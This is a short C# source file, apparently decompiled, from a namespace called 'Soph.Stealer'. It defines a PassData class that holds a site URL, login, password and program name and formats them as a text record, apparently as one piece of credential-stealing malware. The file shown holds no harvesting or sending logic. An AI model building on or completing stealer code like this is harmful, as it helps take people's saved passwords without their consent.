
namespace Soph.Stealer
{
  public class PassData
  {
    public string Url { get; set; }

    public string Login { get; set; }

    public string Password { get; set; }

    public string Program { get; set; }

    public override string ToString()
    {
      return string.Format("SiteUrl : {0}\r\nLogin : {1}\r\nPassword : {2}\r\nProgram : {3}\r\n——————————————————————————————————", (object) this.Url, (object) this.Login, (object) this.Password, (object) this.Program);
    }
  }
}
